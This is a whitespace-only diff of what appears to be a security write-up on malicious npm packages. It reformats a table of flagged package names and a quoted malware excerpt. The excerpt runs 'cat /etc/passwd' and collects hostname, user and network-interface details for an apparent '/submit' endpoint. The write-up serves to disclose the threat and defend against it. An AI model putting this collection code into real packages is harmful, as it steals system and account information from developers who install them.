@@ -18,18 +18,18 @@ Our system picked up the following packages with very similar behaviour
 matching common information gathering techniques:
 
 | Package Name    | Version |
-|-----------------|---------|
-| themes-vendor   | 0.0.1 |
-| x509-escaping   | 0.0.1 |
-| keycloak-server | 0.0.1 |
-| module-stub     | 0.0.1 |
-| keycloak-server | 0.0.3 |
-| postject-copy   | 0.0.0 |
-| micrometer-docs | 0.0.3 |
-| orbit-playroom  | 0.0.0 |
-| x509-escaping   | 0.0.0 |
-| weekendfe       | 0.0.1 |
-| themes-vendor   | 0.0.0 |
+| --------------- | ------- |
+| themes-vendor   | 0.0.1   |
+| x509-escaping   | 0.0.1   |
+| keycloak-server | 0.0.1   |
+| module-stub     | 0.0.1   |
+| keycloak-server | 0.0.3   |
+| postject-copy   | 0.0.0   |
+| micrometer-docs | 0.0.3   |
+| orbit-playroom  | 0.0.0   |
+| x509-escaping   | 0.0.0   |
+| weekendfe       | 0.0.1   |
+| themes-vendor   | 0.0.0   |
 
 `npm` promptly removed these packages from the registry. This was possible
 because no other package depended on these malicious packages. All packages
@@ -63,22 +63,22 @@ const apiPath = '/submit';
 // [...]
 let whoamiInfo = '';
 try {
-    // Execute the 'whoami' command and trim the output
-    whoamiInfo = execSync('cat /etc/passwd', { encoding: 'utf-8' }).trim();
+  // Execute the 'whoami' command and trim the output
+  whoamiInfo = execSync('cat /etc/passwd', { encoding: 'utf-8' }).trim();
 } catch (error) {
-    whoamiInfo = `Error executing whoami: ${error.message}`;
+  whoamiInfo = `Error executing whoami: ${error.message}`;
 }
 
 // [...]
 const deviceInfo = {
-    platform: os.platform(),
-    release: os.release(),
-    hostname: os.hostname(),
-    arch: os.arch(),
-    userInfo: os.userInfo(),
-    networkInterfaces: os.networkInterfaces(),
-    whoamiinfo: whoamiInfo,
-    user: "themes-vendor",
+  platform: os.platform(),
+  release: os.release(),
+  hostname: os.hostname(),
+  arch: os.arch(),
+  userInfo: os.userInfo(),
+  networkInterfaces: os.networkInterfaces(),
+  whoamiinfo: whoamiInfo,
+  user: 'themes-vendor',
 };
 ```
 
